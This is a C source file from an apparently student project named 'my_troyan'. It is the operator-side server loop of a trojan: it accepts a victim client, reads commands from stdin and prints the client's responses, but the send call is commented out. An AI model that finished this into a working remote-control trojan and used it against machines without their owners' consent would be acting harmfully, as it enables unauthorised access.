/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 29/04/2021 process_request.c
*/

#include "troyan_server.h"

static int read_client_response(server_t *server)
{
    bool empty = false;
    char *response;

    response = socket_receive(&server->client, &empty);
    if (!response) {
        client_disconnect(server);
        return EXIT_SUCCESS;
    }
    printf("%s\n", response);
    free(response);
    return EXIT_SUCCESS;
}

static int process_command(server_t *server)
{
    char *line = NULL;
    size_t size = 0;

    ssize_t nb = getline(&line, &size, stdin);
    if (line) {
        if (nb > 0) {
            line[nb - 1] = '\0';
            fprintf(stderr, "line = (%s)\n", line); // DEBUG
            //socket_send(&server->client, line);
        }
        free(line);
    }
    return EXIT_FAILURE;
}

int app_process_request(server_t *server)
{
    if (/*server->client_connected
        && */FD_ISSET(STDIN_FILENO, &server->select.read_fds)) {
        process_command(server);
    }
    if (server->client_connected
        && FD_ISSET(server->client.fd, &server->select.read_fds)) {
        read_client_response(server);
    }
    if (FD_ISSET(server->sock.fd, &server->select.read_fds)) {
        if (client_connect(server) == EXIT_FAILURE)
            return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}
